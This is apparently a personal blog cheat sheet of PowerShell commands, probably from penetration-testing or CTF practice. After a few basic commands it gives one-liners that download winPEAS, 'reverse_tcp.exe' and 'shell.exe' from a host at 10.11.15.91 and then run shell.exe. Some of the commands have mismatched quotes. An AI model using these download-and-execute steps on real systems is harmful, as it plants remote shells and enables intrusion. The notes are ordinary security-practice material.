---
title: PowerShell
author: Edwards
layout: post 
date: 2020-11-15
---

# PowerShell commands

## Basic 

. cd 
. more
. dir

## Download from remote machine 
```bash
powershell -c wget "http://10.11.15.91/winPEASx86.exe -outfile "winPEAS.exe"
```

```bash
powershell "(New-Object Net.WebClient).DownloadFile('http://10.11.15.91:8000/reverse_tcp.exe,'reverse_tcp.exe')"
```

```powershell
powershell -c "Invoke-WebRequest -Uri 'http://10.11.15.91:8000/shell.exe' -OutFile 'shell.exe'
```

execute it with : 
```powershell
.\shell.exe
```
